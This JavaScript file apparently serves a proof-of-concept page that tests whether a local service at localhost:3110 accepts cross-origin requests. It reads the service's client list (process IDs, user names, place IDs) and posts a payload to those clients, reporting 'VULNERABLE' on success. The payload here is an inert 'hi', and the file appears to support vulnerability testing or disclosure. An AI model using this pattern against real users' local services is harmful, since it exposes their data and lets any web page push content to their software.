'use strict';

const ENDPOINT = 'http://localhost:3110/o';
const TIMEOUT_MS = 5000;
const PAYLOAD = 'hi';

const button = document.getElementById('runButton');
const result = document.getElementById('result');

// Display the endpoint and current page origin if elements exist.
const endpointEl = document.getElementById('endpoint');
const originEl = document.getElementById('origin');
if (endpointEl) endpointEl.textContent = ENDPOINT;
if (originEl) originEl.textContent = window.location.origin;

function showResult(state, heading, detail) {
  result.dataset.state = state;
  result.replaceChildren();

  const title = document.createElement('strong');
  title.textContent = heading;
  result.append(title);

  const message = document.createElement('p');
  message.textContent = detail;
  result.append(message);
}

async function runTest() {
  button.disabled = true;
  button.textContent = 'Testing…';

  showResult(
    '',
    'Test running',
    'Fetching active clients and sending POST request...'
  );

  const controller = new AbortController();
  const timeout = setTimeout(() => {
    controller.abort();
  }, TIMEOUT_MS);

  try {
    // 1) Read the client list cross-origin via GET (CORS * applies).
    let clients = [];
    try {
      const g = await fetch(ENDPOINT, {
        method: 'GET',
        mode: 'cors',
        signal: controller.signal,
        cache: 'no-store'
      });
      clients = await g.json().catch(() => []);
    } catch (_) {}

    // Client rows are [pid, user, ver, status, placeId]; Clients header wants STRING pids.
    const pids = (Array.isArray(clients) ? clients : [])
      .map(c => Array.isArray(c) ? c[0] : (c.pid || c.Pid))
      .filter(Boolean)
      .map(String);

    // 2) Cross-origin POST request with the "hi" payload and dynamic client IDs.
    const response = await fetch(ENDPOINT, {
      method: 'POST',
      mode: 'cors',
      headers: {
        'Content-Type': 'text/plain',
        'Clients': JSON.stringify(pids.length ? pids : ['0'])
      },
      body: PAYLOAD,
      signal: controller.signal,
      cache: 'no-store'
    });

    let bodyPreview = '';
    try {
      const text = await response.text();
      bodyPreview = text.slice(0, 500);
    } catch (_) {
      bodyPreview = 'The response body could not be read.';
    }

    if (response.ok) {
      showResult(
        'success',
        `VULNERABLE — Endpoint responded: HTTP ${response.status}`,
        'Cross-origin POST request accepted and payload delivered.'
      );
    } else {
      showResult(
        'warning',
        `Reachable, HTTP ${response.status}`,
        'The browser could communicate with the endpoint, but the server returned a non-success status code.'
      );
    }

    if (clients.length > 0 || bodyPreview) {
      const preview = document.createElement('pre');
      preview.textContent =
        `Clients visible to this page:\n${JSON.stringify(clients, null, 2)}\n\n` +
        `Response preview:\n${bodyPreview}`;
      result.append(preview);
    }

  } catch (error) {
    const detail =
      error.name === 'AbortError'
        ? `The request timed out after ${TIMEOUT_MS / 1000} seconds.`
        : 'The browser could not complete or read the request. The service may be stopped, the route may be unavailable, or CORS may have blocked access.';

    showResult('error', 'Request failed', detail);
  } finally {
    clearTimeout(timeout);
    button.disabled = false;
    button.textContent = 'Run connectivity test';
  }
}

if (button) {
  button.addEventListener('click', runTest);
}
